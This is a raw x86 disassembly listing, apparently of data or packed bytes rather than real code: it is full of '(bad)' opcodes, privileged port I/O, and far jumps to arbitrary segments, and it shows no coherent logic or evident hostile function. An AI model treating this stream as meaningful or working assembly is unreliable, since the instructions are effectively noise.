  412b7d:	shr    DWORD PTR [edi-0x5e],1
  412b80:	loopne 0x412ba6
  412b82:	push   ebp
  412b83:	sbb    eax,DWORD PTR [ebp-0x1]
  412b86:	dec    edx
  412b87:	mov    dl,ch
  412b89:	adc    eax,DWORD PTR [edi]
  412b8b:	inc    ecx
  412b8c:	push   cs
  412b8d:	pop    esp
  412b8e:	test   DWORD PTR ds:0xda1a5f2b,edi
  412b94:	xchg   ebp,eax
  412b95:	in     al,dx
  412b96:	cmpxchg DWORD PTR [esi],eax
  412b99:	ds push 0xd55f0de
  412b9f:	push   cs
  412ba0:	or     al,0x90
  412ba2:	loopne 0x412b82
  412ba4:	jle    0x412b62
  412ba6:	(bad)  
  412ba7:	fwait
  412ba8:	mov    dh,0xfa
  412baa:	jnp    0x412c0f
  412bac:	and    DWORD PTR [esi],0xfffffff1
  412baf:	(bad)  
  412bb0:	fidivr DWORD PTR fs:[ebp+ecx*2+0x5753633c]
  412bb8:	push   ds
  412bb9:	adc    dl,BYTE PTR [ebx-0x4d]
  412bbc:	jb     0x412c28
  412bbe:	pop    eax
  412bbf:	test   eax,0x5ca1ac2b
  412bc4:	push   edi
  412bc5:	and    DWORD PTR [esi+0x5330796e],esi
  412bcb:	mov    edi,0x7f83a605
  412bd0:	mov    ds:0x7c58dd16,eax
  412bd5:	and    edi,DWORD PTR [esi+0x10]
  412bd8:	popa   
  412bd9:	or     bl,BYTE PTR [ecx+0x28ca7c04]
  412bdf:	ins    BYTE PTR es:[edi],dx
  412be0:	inc    edi
  412be1:	scas   al,BYTE PTR es:[edi]
  412be2:	add    edi,edx
  412be4:	into   
  412be5:	sub    BYTE PTR [eax+0x4a40476],ch
  412beb:	outs   dx,DWORD PTR ds:[esi]
  412bec:	lods   al,BYTE PTR ds:[esi]
  412bed:	stos   DWORD PTR es:[edi],eax
  412bee:	inc    ebx
  412bef:	hlt    
  412bf0:	mov    bl,0x6a
  412bf2:	(bad)
  412bf5:	fs inc ecx
  412bf7:	popf   
  412bf8:	mul    DWORD PTR [esi]
  412bfa:	mov    WORD PTR [ecx+0xc],ds
  412bfd:	sbb    DWORD PTR [ebx+0x6cfd15f4],ebx
  412c03:	repnz fs push edi
  412c06:	sbb    BYTE PTR [ecx],0x32
  412c09:	cmp    BYTE PTR [edx],bl
  412c0b:	popa   
  412c0c:	pop    edx
  412c0d:	push   ebp
  412c0e:	add    eax,0xd4a1fd60
  412c13:	pushf  
  412c14:	mov    BYTE PTR [edx+0x591e6207],ch
  412c1a:	xchg   ebx,eax
  412c1b:	xor    al,0x6d
  412c1d:	mov    al,0x79
  412c1f:	push   ebx
  412c20:	mov    edx,0xaff9f26
  412c25:	pop    eax
  412c26:	cmp    DWORD PTR [edx+0x3789e7bc],ebx
  412c2c:	mov    bh,0x82
  412c2e:	int    0x7f
  412c30:	(bad)  
  412c31:	test   eax,0x127dcf08
  412c36:	push   ss
  412c37:	push   es
  412c38:	or     ecx,esp
  412c3a:	sahf   
  412c3b:	popa   
  412c3c:	sbb    DWORD PTR [eax+0x76],ebx
  412c3f:	fwait
  412c40:	push   0xffffffe5
  412c42:	pop    edx
  412c43:	pusha  
  412c44:	bswap  ebp
  412c46:	inc    edi
  412c47:	push   es
  412c48:	scas   al,BYTE PTR es:[edi]
  412c49:	sahf   
  412c4a:	sbb    edx,esp
  412c4c:	repnz or DWORD PTR [edi+0x73745a8c],esp
  412c53:	mov    ds:0xec2321e,eax
  412c58:	call   0x914d:0x6d900a33
  412c5f:	pop    es
  412c60:	and    dl,BYTE PTR [edx+0x48]
  412c63:	into   
  412c64:	adc    al,0xb6
  412c66:	lods   eax,DWORD PTR ds:[esi]
  412c67:	in     ax,dx
  412c69:	xchg   ebp,eax
  412c6a:	in     eax,dx
  412c6b:	icebp  
  412c6c:	mov    ah,0xc6
  412c6e:	mov    ch,0xeb
  412c70:	out    0xc4,eax
  412c72:	mov    ebx,ebp
  412c74:	push   ecx
  412c75:	xor    BYTE PTR [esi-0x21c5ff5f],0x9a
  412c7c:	shl    BYTE PTR [ebx+0x4aa66449],0xdf
  412c83:	test   dl,ah
  412c85:	(bad)  [esi-0x6de3cb04]
  412c8b:	pop    ss
  412c8c:	gs jp  0x412ce4
  412c8f:	out    0xf8,al
  412c91:	arpl   si,dx
  412c93:	fld    st(5)
  412c95:	mov    ?,WORD PTR [edi-0x65]
  412c98:	add    DWORD PTR [ecx-0x45a2dc26],0x56c0f94c
  412ca2:	jl     0x412cb3
  412ca4:	lock jle 0x412cf2
  412ca7:	jno    0x412ca0
  412ca9:	sbb    cl,BYTE PTR [esi-0x4a]
  412cac:	mov    al,0x7d
  412cae:	adc    al,0x8f
  412cb0:	bound  esp,QWORD PTR [edx]
  412cb2:	into   
  412cb3:	pop    ecx
  412cb4:	xor    eax,0xb1548421
  412cb9:	adc    ebx,edx
  412cbb:	retf   
  412cbc:	ss jns 0x412d24
  412cbf:	imul   edx,DWORD PTR cs:[edx-0x49a1f779],0xa6aeab35
  412cca:	cld    
  412ccb:	jae    0x412cea
  412ccd:	push   ds
  412cce:	aaa    
  412ccf:	mov    ebx,0x7627b2ab
  412cd4:	dec    edi
  412cd5:	lock or esp,DWORD PTR [edi+edi*8-0x63a42787]
  412cdd:	mov    ds:0xe7cd8ec5,eax
  412ce2:	jae    0x412c91
  412ce4:	lea    ecx,[edi+0x7f]
  412ce7:	sub    BYTE PTR [esi-0x133e09cb],ch
  412ced:	ins    BYTE PTR es:[edi],dx
  412cee:	inc    esi
  412cef:	mov    DWORD PTR ds:0x3f936a55,edx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	inc    esp
  412cf7:	sbb    eax,ebx
  412cf9:	pop    esi
  412cfb:	test   DWORD PTR [ebp-0x7fb30b4],edi
  412d01:	add    ebx,DWORD PTR [edx]
  412d03:	imul   esi,esp,0x15
  412d06:	test   DWORD PTR [edi+0x34],0x354c453c
  412d0d:	loop   0x412d3f
  412d0f:	adc    BYTE PTR [ecx+eax*2+0x4b],dh
  412d13:	jnp    0x412cb8
  412d15:	je     0x412d3f
  412d17:	push   es
  412d18:	pop    edx
  412d19:	lahf   
  412d1a:	(bad)  
  412d1b:	sbb    al,0xb2
  412d1d:	adc    DWORD PTR [ecx+0x34],esp
  412d20:	arpl   sp,ax
  412d22:	pop    ebp
  412d23:	cmp    al,0x1a
  412d25:	jne    0x412d98
  412d27:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d29:	loop   0x412cee
  412d2b:	sub    eax,0xcb31ac2
  412d30:	ja     0x412d13
  412d32:	nop
  412d33:	or     al,0xbd
  412d35:	fdiv   DWORD PTR [esi+0x179f0e0c]
  412d3b:	imul   eax,edi,0xffffffcc
  412d3e:	push   ss
  412d3f:	xor    BYTE PTR [edi+0xa],bl
  412d42:	shl    BYTE PTR [edi-0x1bc56f76],1
  412d48:	out    dx,eax
  412d49:	(bad)  
  412d4a:	out    dx,eax
  412d4b:	mov    al,0xec
  412d4d:	add    ah,BYTE PTR [edi]
  412d4f:	or     bh,BYTE PTR [edi+0x681c25c5]
  412d55:	(bad)  
  412d57:	xchg   BYTE PTR [eax],ch
  412d59:	sahf   
  412d5a:	(bad)  
  412d5b:	adc    ah,BYTE PTR ds:0x647ab45a
  412d61:	add    eax,0x618604d3
  412d66:	cmp    cl,bh
  412d68:	mov    ds:0x159e36fd,eax
  412d6d:	pop    ss
  412d6e:	je     0x412d7e
  412d70:	xchg   ebp,eax
  412d71:	xchg   DWORD PTR [edx+0xf],ebp
  412d74:	lahf   
  412d75:	pop    edi
  412d76:	jmp    0x2142:0x8528ad56
  412d7d:	mov    dl,0x1
  412d7f:	dec    esp
  412d80:	in     eax,0xfe
  412d82:	pop    ebp
  412d83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d84:	push   ebx
  412d85:	adc    eax,0x672762cb
  412d8a:	adc    eax,0xdb57bb8f
  412d8f:	and    al,0xa3
  412d91:	sub    eax,DWORD PTR [eax+0x45]
  412d94:	mov    edi,0x1c7f01d8
  412d99:	dec    edx
  412d9a:	sub    eax,0x48ba8151
  412d9f:	xor    esi,ebx
  412da1:	out    0x68,al
  412da3:	loop   0x412dd1
  412da5:	lods   eax,DWORD PTR ds:[esi]
  412da6:	mov    edi,0xc17ba9c4
  412dab:	jbe    0x412dd8
  412dad:	call   0xc9a9:0xdd216da5
  412db4:	es sub al,0x80
  412db7:	push   cs
  412db8:	ins    DWORD PTR es:[edi],dx
  412db9:	or     bl,BYTE PTR [esi]
  412dbb:	xor    ebx,ebp
  412dbd:	out    dx,al
  412dbe:	sub    al,0x10
  412dc0:	fsubr  QWORD PTR [ebx]
  412dc2:	(bad)  
  412dc4:	sbb    BYTE PTR gs:[eax-0x2aa412f7],ah
  412dcb:	pop    edx
  412dcc:	aaa    
  412dcd:	adc    ah,BYTE PTR [esi+0x617b7825]
  412dd3:	das    
  412dd4:	fsub   st,st(7)
  412dd6:	sbb    al,0x20
  412dd8:	cdq    
  412dd9:	sbb    al,0xe
  412ddb:	loopne 0x412e41
  412ddd:	push   ds
  412dde:	sub    eax,DWORD PTR [esi+0x4e2d1a59]
  412de4:	ins    BYTE PTR es:[edi],dx
  412de5:	jne    0x412dd1
  412de7:	xlat   BYTE PTR ds:[ebx]
  412de8:	mov    ecx,0x8bae2a5d
  412ded:	pop    edx
  412dee:	adc    cl,BYTE PTR ds:0xec8af104
  412df4:	sub    ebx,ebx
  412df6:	pop    es
  412df7:	enter  0xd0dd,0xa7
  412dfb:	inc    esp
  412dfc:	or     bh,BYTE PTR [edi]
  412dfe:	(bad)  
  412dff:	push   esp
  412e00:	and    DWORD PTR [ebp+0x28afc2f9],ebp
  412e06:	sub    ah,BYTE PTR [esi-0x17]
  412e09:	enter  0xf14e,0x23
  412e0d:	pop    ecx
  412e0e:	neg    DWORD PTR [edi+0x26f831dc]
  412e14:	(bad)  
  412e15:	jnp    0x412e5f
  412e17:	pop    edi
  412e18:	and    esp,esp
  412e1a:	lods   eax,DWORD PTR ds:[esi]
  412e1b:	imul   edx,DWORD PTR [edx+0x6d220555],0xffffffa2
  412e22:	add    edx,DWORD PTR [edx+esi*1]
  412e25:	mov    BYTE PTR [esi+0x32],bl
  412e28:	mul    BYTE PTR [esi-0x14]
  412e2b:	mov    BYTE PTR ds:0xc36ee78c,ah
  412e31:	into   
  412e32:	and    edi,DWORD PTR [ebp+0x49915104]
  412e38:	neg    cl
  412e3a:	xlat   BYTE PTR ds:[ebx]
  412e3b:	dec    ebx
  412e3c:	cmp    al,0xfb
  412e3e:	sbb    DWORD PTR [esi],eax
  412e40:	enter  0xa375,0xfb
  412e44:	in     al,0x8b
  412e46:	ins    BYTE PTR es:[edi],dx
  412e47:	push   cs
  412e48:	fild   WORD PTR [ecx+0x24bb98c]
  412e4e:	clc    
  412e4f:	ja     0x412e7d
  412e51:	mov    esp,0xd6de650e
  412e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e57:	daa    
  412e58:	add    al,BYTE PTR [eax-0x39]
  412e5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e5c:	js     0x412e5d
  412e5e:	push   edx
  412e5f:	sub    bl,BYTE PTR [edx+0xb6ac6ab]
  412e65:	fcomip st,st(6)
  412e67:	pusha  
  412e68:	loopne 0x412e50
  412e6a:	test   eax,0x257b411a
  412e6f:	push   es
  412e70:	(bad)  
  412e71:	in     eax,dx
  412e72:	pop    ds
  412e73:	dec    ebp
  412e74:	das    
  412e75:	xor    BYTE PTR [edi-0x8154090],dl
  412e7b:	mov    cl,0xf0
  412e7d:	or     BYTE PTR [ebx],cl
  412e7f:	addr16 or al,0x70
  412e82:	repnz or al,0x9
  412e85:	mov    dh,0x13
  412e87:	push   cs
  412e88:	sub    BYTE PTR [edx+0x3f2095e8],bh
  412e8e:	inc    edx
  412e8f:	imul   ecx,DWORD PTR [ecx],0x23dd0a5e
  412e95:	shr    esp,1
  412e97:	pop    edx
  412e98:	fs xchg ebx,eax
  412e9a:	sbb    BYTE PTR [eax*2-0x465937f],dl
  412ea1:	jne    0x412f07
  412ea3:	aaa    
  412ea4:	shl    DWORD PTR [edx+0x300cd92],1
  412eaa:	cmp    al,0x82
  412eac:	lods   al,BYTE PTR ds:[esi]
  412ead:	jmp    0x659974e2
  412eb2:	call   0x4afe995e
  412eb7:	sbb    al,0x0
  412eb9:	sbb    al,0xa
  412ebb:	add    al,0x7b
  412ebd:	nop
  412ebe:	(bad)
  412ec1:	int3   
  412ec2:	mov    esi,edx
  412ec4:	dec    ebx
  412ec5:	add    al,0xa1
  412ec7:	add    DWORD PTR [eax-0xb],esp
  412eca:	fsub   st(1),st
  412ecc:	pushf  
  412ecd:	pop    esi
  412ece:	cmp    edx,eax
  412ed0:	pushf  
  412ed1:	jnp    0x412e9b
  412ed3:	adc    eax,0x8cd51f47
  412ed8:	xchg   ebp,eax
  412ed9:	leave  
  412eda:	adc    esi,DWORD PTR [eax]
  412edc:	(bad)  
  412edd:	cld    
  412ede:	pusha  
  412edf:	bnd ret 
  412ee1:	rdseed ebx
  412ee4:	and    BYTE PTR [ebp-0x4f],dl
  412ee7:	hlt    
  412ee8:	mov    al,ds:0x7b73ce03
  412eed:	or     BYTE PTR [ecx+0x51],dl
  412ef0:	bound  ebp,QWORD PTR [esp+edx*2+0x58]
  412ef4:	imul   ecx,esi,0x1
  412ef7:	stos   BYTE PTR es:[edi],al
  412ef8:	push   ebp
  412ef9:	imul   edx,edi,0xffffff94
  412efc:	xchg   ecx,eax
  412efd:	enter  0x3035,0xd4
  412f01:	in     al,dx
  412f02:	xor    esp,DWORD PTR [esi+0x2f2ed788]
  412f08:	jmp    0x412f51
  412f0a:	mov    eax,0x56039d0
  412f0f:	mov    al,0xd2
  412f11:	push   ebp
  412f12:	mov    bh,BYTE PTR [edx]
  412f14:	mov    eax,ds:0xf8b27441
  412f19:	pop    ss
  412f1a:	aaa    
  412f1b:	inc    esp
  412f1c:	push   es
  412f1d:	lods   eax,DWORD PTR es:[esi]
  412f1f:	mov    al,BYTE PTR ss:[edx-0x78d2eedd]
  412f26:	sbb    ecx,DWORD PTR [ebx+ebp*4+0x3e037f7f]
  412f2d:	mov    esi,0x77109d3f
  412f32:	add    esi,edi
  412f34:	xchg   ebx,eax
  412f35:	mov    DWORD PTR [ebx],ebp
  412f37:	xor    al,0xb4
  412f39:	aad    0x3d
  412f3b:	fdiv   DWORD PTR [ebp+edx*8+0x3b56e8b3]
  412f42:	pusha  
  412f43:	jnp    0x412f7a
  412f45:	loopne 0x412f62
  412f47:	fidiv  WORD PTR ds:0x17b7e9aa
  412f4d:	sbb    dl,ch
  412f4f:	icebp  
  412f50:	sahf   
  412f51:	repz mov ah,0xd3
  412f54:	push   esi
  412f55:	mov    bl,0x67
  412f57:	jp     0x412f83
  412f59:	mov    fs,WORD PTR [esi+0x39]
  412f5c:	bound  esp,QWORD PTR [edi]
  412f5e:	call   0x526c:0xd1188e6b
  412f65:	inc    ebx
  412f66:	jno    0x412fd3
  412f68:	push   esi
  412f69:	stc    
  412f6a:	push   0x28
  412f6c:	imul   esi,edi,0x55a67cc3
  412f72:	adc    eax,0x7a112bea
  412f77:	(bad)  
  412f79:	push   esp
  412f7a:	ins    BYTE PTR es:[edi],dx
  412f7b:	mov    WORD PTR [ebx-0x1a74a11b],ss
  412f81:	mov    dh,0x8a
  412f83:	mov    esi,0x46373bba
  412f88:	scas   al,BYTE PTR es:[edi]
  412f89:	push   ebp
  412f8a:	in     al,dx
  412f8b:	(bad)  
  412f8d:	lds    ecx,FWORD PTR [eax-0x2d]
  412f90:	mov    eax,ds:0x676c2b81
  412f95:	push   esp
  412f96:	push   edi
  412f97:	lock xor DWORD PTR [edi-0x263dd62a],0x1c
  412f9f:	cmp    al,0xfa
  412fa1:	dec    edx
  412fa2:	pop    eax
  412fa3:	repz les ebp,FWORD PTR [edi]
  412fa6:	cmp    eax,0xd81a13b8
  412fab:	inc    esi
  412fac:	inc    eax
  412fad:	das    
  412fae:	or     eax,0x776b3a24
  412fb3:	stos   BYTE PTR es:[edi],al
  412fb4:	jecxz  0x412fe0
  412fb6:	dec    edi
  412fb7:	loopne 0x412f59
  412fb9:	mov    ecx,0x2452adc1
  412fbe:	inc    ebp
  412fbf:	(bad)  
  412fc0:	(bad)  
  412fc1:	fiadd  WORD PTR [ecx]
  412fc3:	mov    cl,0x3f
  412fc5:	mov    dh,0x1b
  412fc7:	cwde   
  412fc8:	jg     0x412f7e
  412fca:	adc    BYTE PTR [esi-0x6561a3ac],dh
  412fd0:	fistp  DWORD PTR [ecx+ebx*8]
  412fd3:	mov    WORD PTR [eax+0x44],ss
  412fd6:	pop    ds
  412fd7:	push   ds
  412fd8:	das    
  412fd9:	jns    0x41305a
  412fdb:	sub    DWORD PTR [ebx-0x6522f67f],ebx
  412fe1:	enter  0x4dde,0x47
  412fe5:	(bad)  
  412fe6:	retf   
  412fe7:	xor    eax,0x255989a1
  412fec:	call   0x7393:0x9d25a260
  412ff3:	xor    al,0x2f
  412ff5:	pop    ss
  412ff6:	das    
  412ff7:	lea    ecx,[ecx]
  412ff9:	cwde   
  412ffa:	push   0x27
  412ffc:	push   ebp
  412ffd:	lds    esp,FWORD PTR [eax+0x5a]
  413000:	aad    0xb5
  413002:	into   
  413003:	bound  ebp,QWORD PTR [ecx]
  413005:	sbb    eax,0xfbeec28
  41300a:	fst    QWORD PTR [ebp+edx*8+0x5c445f34]
  413011:	sub    cl,bl
  413013:	pop    es
  413014:	mov    bl,0x3c
  413016:	sbb    DWORD PTR [eax+0x443a0155],edx
  41301c:	scas   al,BYTE PTR es:[edi]
  41301d:	pop    edx
  41301e:	adc    DWORD PTR [edx],0xffffffb8
  413021:	mov    edx,0xfff07ddd
  413026:	gs xchg ebp,eax
  413028:	push   0x23
  41302a:	pusha  
  41302b:	push   edi
  41302c:	jmp    0x77ed:0xea6c697
  413033:	addr16 adc eax,0x78ce4538
  413039:	scas   eax,DWORD PTR es:[edi]
  41303a:	inc    ebx
  41303b:	push   0xcf71ff8a
  413040:	and    dl,dh
  413042:	popf   
  413043:	mov    ?,WORD PTR [di]
  413046:	shl    ebx,0xe6
  413049:	aas    
  41304a:	sub    cl,dh
  41304c:	std    
  41304d:	into   
  41304e:	sub    DWORD PTR [eax-0x7b],edi
  413051:	cmc    
  413052:	mov    ds:0x356a3bec,eax
  413057:	or     dl,BYTE PTR [edx-0x13]
  41305a:	aam    0x4a
  41305c:	sbb    al,0xf6
  41305e:	jo     0x413011
  413060:	adc    ecx,eax
  413062:	sti    
  413063:	sbb    eax,0xfc19b52a
  413068:	das    
  413069:	jge    0x4130d5
  41306b:	dec    eax
  41306c:	pop    esi
  41306d:	dec    edi
  41306e:	test   al,0xe3
  413070:	adc    edx,ebp
  413072:	adc    DWORD PTR [eax-0x17],edx
  413075:	arpl   bp,bp
  413077:	push   0x23
  413079:	sar    DWORD PTR [ebx+0x4c],0x99
  41307d:	mov    ecx,0x4dcf6521
  413082:	int    0x65
  413084:	cmp    cl,dl
  413086:	adc    eax,0x5be423e5
  41308b:	lods   eax,DWORD PTR ds:[esi]
  41308c:	pop    edi
  41308d:	out    0xb5,eax
  41308f:	repz sbb eax,0xcddbf3a8
  413095:	or     eax,DWORD PTR [edi+0x18]
  413098:	je     0x41306f
  41309a:	retf   
  41309b:	int3   
  41309c:	mov    ds:0x92b1d88b,al
  4130a1:	popf   
  4130a2:	push   0x23
  4130a4:	inc    esi
  4130a5:	fidivr WORD PTR [edx-0x4cc0f24a]
  4130ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4130ac:	jae    0x413126
  4130ae:	mov    al,ds:0x6217994f
  4130b3:	sbb    DWORD PTR ds:[esi-0x5d],edi
  4130b7:	push   es
  4130b8:	pop    ss
  4130b9:	(bad)  
  4130ba:	mov    ds:0xb2847f97,al
  4130bf:	xchg   edi,eax
  4130c0:	push   ebp
  4130c1:	jg     0x413139
  4130c3:	push   ebp
  4130c4:	push   eax
  4130c5:	inc    eax
  4130c6:	call   FWORD PTR [eax+eiz*4]
  4130c9:	lods   al,BYTE PTR ds:[esi]
  4130ca:	fmulp  st(4),st
  4130cc:	es jnp 0x4130dd
  4130cf:	ins    BYTE PTR es:[edi],dx
  4130d0:	sahf   
  4130d1:	inc    esp
  4130d2:	icebp  
  4130d3:	je     0x4130a9
  4130d5:	mov    bh,0xb6
  4130d7:	pop    eax
  4130d8:	lea    esi,[edi-0x4]
  4130db:	pop    eax
  4130dc:	fcmovb st,st(4)
  4130de:	xor    al,0x78
  4130e0:	sub    DWORD PTR [edi-0xe41e890],edi
  4130e6:	es push ebx
  4130e8:	sub    al,0xe4
  4130ea:	push   esi
  4130eb:	jp     0x41306f
  4130ed:	sub    eax,0xc7727774
  4130f2:	retf   0x34f5
  4130f5:	arpl   bp,bp
  4130f7:	bound  edi,QWORD PTR [esi-0x6a]
  4130fa:	nop
  4130fb:	mov    bl,0xc5
  4130fd:	mov    DWORD PTR [ebp+ebx*4-0x3f0273e6],edi
  413104:	dec    esp
  413105:	lock aad 0x40
  413108:	and    ah,BYTE PTR [esi-0x7db12817]
  41310e:	sbb    BYTE PTR [esi+0x409f8760],cl
  413114:	hlt    
  413115:	adc    DWORD PTR [eax+0x62629fc1],ebp
  41311b:	cwde   
  41311c:	xchg   edx,eax
  41311d:	aaa    
  41311e:	or     al,0xa2
  413120:	sbb    eax,esp
  413122:	jecxz  0x41311c
  413124:	cs xor ebp,edi
  413127:	jg     0x4130b9
  413129:	adc    DWORD PTR [ebx+edx*4+0x38],0xfffffff4
  41312e:	mov    eax,ds:0x5df421be
  413133:	push   edx
  413134:	lods   al,BYTE PTR ds:[esi]
  413135:	push   ss
  413136:	jge    0x4131a2
  413138:	out    0x27,al
  41313a:	xlat   BYTE PTR ds:[ebx]
  41313b:	mov    eax,DWORD PTR [ebp-0x70]
  41313e:	xor    dl,ah
  413140:	loope  0x4131ad
  413142:	in     eax,dx
  413143:	mov    eax,ds:0xcd4e4dc6
  413148:	sub    eax,0x3382a9f9
  41314d:	sub    eax,0xb53f276c
  413152:	sbb    bh,BYTE PTR [eax+ecx*1]
  413155:	jo     0x4131c6
  413157:	(bad)  
  413158:	int3   
  413159:	xor    al,0xc1
  41315b:	or     edi,edi
  41315d:	sar    BYTE PTR [ebp+ecx*2+0x34e644f1],cl
  413164:	scas   al,BYTE PTR es:[edi]
  413165:	inc    edi
  413166:	nop
  413167:	ja     0x4131af
  413169:	mov    eax,ds:0xb42614ec
  41316e:	xchg   edi,eax
  41316f:	jne    0x413100
  413171:	imul   ebx,DWORD PTR [ecx],0x37
  413174:	push   cs
  413175:	or     DWORD PTR [eax+0x47666805],0x536fa77f
  41317f:	icebp  
  413180:	addr16 in al,0x45
  413183:	bound  ebx,QWORD PTR [edi+0x73]
  413186:	dec    BYTE PTR [eax+0xbe8ba5c]
  41318c:	mov    ebx,0x8cbb2004
  413191:	jle    0x413148
  413193:	adc    DWORD PTR [ebp+0x4e],esp
  413196:	mov    DWORD PTR [esi-0xa],esp
  413199:	dec    edx
  41319a:	jp     0x41313e
  41319c:	push   ecx
  41319d:	outs   dx,BYTE PTR ds:[esi]
  41319e:	es stos BYTE PTR es:[edi],al
  4131a0:	adc    bl,BYTE PTR [esi]
  4131a2:	arpl   sp,di
  4131a4:	and    BYTE PTR [ebx-0x76],ah
  4131a7:	add    al,BYTE PTR [edi+0x1e]
  4131aa:	(bad)  
  4131ac:	bound  eax,QWORD PTR [edx-0x5cc33fb2]
  4131b2:	mov    esp,0xdb543c7f
  4131b7:	rcl    cl,0xd9
  4131ba:	sub    eax,0xfbced3d6
  4131bf:	lock sub ch,BYTE PTR [esi+0x44]
  4131c3:	add    eax,0x5ab5e0a5
  4131c8:	sbb    eax,0x21ac62db
  4131cd:	sti    
  4131ce:	jl     0x4131f5
  4131d0:	scas   eax,DWORD PTR es:[edi]
  4131d1:	rcr    BYTE PTR [eax],1
  4131d3:	dec    ebp
  4131d4:	mov    ch,0xe4
  4131d6:	add    bl,BYTE PTR [ecx]
  4131d8:	test   eax,0x559d95d2
  4131dd:	push   esi
  4131de:	mov    ebx,0xa120d431
  4131e3:	adc    cl,BYTE PTR [esi+edi*4+0x59]
  4131e7:	mov    cl,0xcb
  4131e9:	jge    0x41325d
  4131eb:	sub    edx,edi
  4131ed:	jg     0x4131b8
  4131ef:	jl     0x4131c6
  4131f1:	inc    ecx
  4131f2:	push   0x84fd5812
  4131f7:	pop    esi
  4131f8:	xor    al,0x68
  4131fa:	scas   eax,DWORD PTR es:[edi]
  4131fb:	jo     0x4131ae
  4131fd:	jmp    0x4131cd
  4131ff:	sbb    eax,0xfb6f7aa6
  413204:	fbstp  TBYTE PTR [ebp-0x4d]
  413207:	sub    eax,0x2f726983
  41320c:	push   esp
  41320d:	adc    eax,0xfd7749e5
  413212:	xchg   DWORD PTR [ebx+0x153832e8],ebp
  413218:	shl    DWORD PTR [eax],1
  41321a:	(bad)  
  41321b:	xor    bh,BYTE PTR [ecx+0x3461fb25]
  413221:	inc    esi
  413222:	xchg   ecx,eax
  413223:	or     esp,eax
  413225:	in     eax,0xc3
  413227:	push   esi
  413228:	scas   al,BYTE PTR es:[edi]
  413229:	mov    cl,0x36
  41322b:	icebp  
  41322c:	cs enter 0xf7f7,0xd6
  413231:	cmp    ah,BYTE PTR [ebx*8+0x1679fa6d]
  413238:	test   ah,bh
  41323a:	mov    dh,ah
  41323c:	ret    0xf8c6
  41323f:	mov    fs,WORD PTR [ebp+0xd5d574d]
  413245:	xchg   edx,eax
  413246:	stos   BYTE PTR es:[edi],al
  413247:	aam    0xec
  413249:	push   edx
  41324a:	iret   
  41324b:	stos   BYTE PTR es:[edi],al
  41324c:	push   ecx
  41324d:	dec    esp
  41324e:	(bad)  
  41324f:	je     0x413258
  413251:	jge    0x41325b
  413253:	push   ebp
  413254:	jb     0x4132ad
  413256:	mov    ss:0xb0231fe,eax
  41325c:	jne    0x41321e
  41325e:	hlt    
  41325f:	mov    dl,0x45
  413261:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  413263:	call   0x9253223c
  413268:	ins    BYTE PTR es:[edi],dx
  413269:	mov    bl,0xd9
  41326b:	mov    dh,0xc2
  41326d:	add    al,0xf
  41326f:	cwde   
  413270:	adc    esi,edi
  413272:	inc    ebp
  413273:	aam    0x6a
  413275:	xor    ch,0xf5
  413278:	mov    ebx,0x623d98e3
  41327d:	mov    esp,0x345ff04d
  413282:	ins    DWORD PTR es:[edi],dx
  413283:	mov    ds:0xec1e0757,eax
  413288:	(bad)  [esi]
  41328a:	sbb    ebx,edx
  41328c:	xchg   ebx,eax
  41328d:	sbb    al,0xa
  41328f:	jmp    0x795d8eec
  413294:	inc    esi
  413295:	xor    BYTE PTR [esi],al
  413297:	cs mov edi,0x1a0f7a0b
  41329d:	sbb    bl,al
  41329f:	inc    edx
  4132a0:	xor    eax,0x9a96713
  4132a5:	mov    WORD PTR [edx-0x45a33126],ss
  4132ab:	ss in  al,dx
  4132ad:	shr    BYTE PTR [eax-0x252841e4],0x4
  4132b4:	xchg   esi,eax
  4132b5:	push   ecx
  4132b6:	out    dx,eax
  4132b7:	lea    ebx,[edi+0x1ffd9f7]
  4132bd:	aas    
  4132be:	mov    ds:0x819f1f2b,al
  4132c3:	into   
  4132c4:	mov    eax,ds:0x5d521ce4
  4132c9:	sub    BYTE PTR [esi],cl
  4132cb:	bound  ecx,QWORD PTR [eax]
  4132cd:	push   esp
  4132ce:	stos   DWORD PTR es:[edi],eax
  4132cf:	das    
  4132d0:	xchg   DWORD PTR [ecx],eax
  4132d2:	sbb    dh,BYTE PTR [ecx+0x2b]
  4132d5:	mov    ch,0x94
  4132d7:	add    ah,ch
  4132d9:	adc    DWORD PTR ds:0x8f4f516f,ebx
  4132df:	pushf  
  4132e0:	(bad)  
  4132e1:	icebp  
  4132e2:	(bad)  
  4132e3:	imul   ebx,DWORD PTR [ecx+0x7506310c],0xffffffd1
  4132ea:	pop    es
  4132eb:	mov    ds:0xc3795ad5,eax
  4132f0:	inc    edx
  4132f1:	icebp  
  4132f2:	dec    edx
  4132f3:	mov    eax,ds:0x4c63925c
  4132f8:	mov    eax,ds:0xa70d7431
  4132fd:	mov    bl,bl
  4132ff:	js     0x413319
  413301:	data16 jns 0x413374
  413304:	push   es
  413305:	(bad)  
  413306:	ins    DWORD PTR es:[edi],dx
  413307:	pop    esi
  413308:	xor    eax,0xeefdecc3
  41330d:	(bad)  
  41330e:	xor    eax,0xee7355af
  413313:	int    0xa2
  413315:	pop    edx
  413316:	enter  0xcc7b,0x5e
  41331a:	fbstp  TBYTE PTR [esi+0x117a14ad]
  413320:	inc    edi
  413321:	jb     0x41333a
  413323:	loope  0x4132d5
  413325:	sbb    dh,BYTE PTR [eax+0x42eb0310]
  41332b:	sar    BYTE PTR [esi+eax*4-0x23],1
  41332f:	fdivp  st(2),st
  413331:	jno    0x41332c
  413333:	outs   dx,BYTE PTR ds:[esi]
  413334:	cs and eax,0xffffffdd
  413338:	and    BYTE PTR [edi-0x5a],bh
  41333b:	sbb    BYTE PTR [esi+eiz*2-0x45b388c3],ah
  413342:	ins    DWORD PTR es:[edi],dx
  413343:	(bad)  
  413344:	mov    ds:0xe1ce700d,eax
  413349:	fisttp QWORD PTR [esi]
  41334b:	push   edi
  41334c:	(bad)  
  41334d:	pop    esp
  41334e:	mov    ds:0xf762b458,al
  413353:	(bad)  
  413354:	jle    0x413330
  413356:	lea    edx,[ebx]
  413358:	push   eax
  413359:	add    DWORD PTR [esi],0xc6069891
  41335f:	jb     0x4133aa
  413361:	out    dx,eax
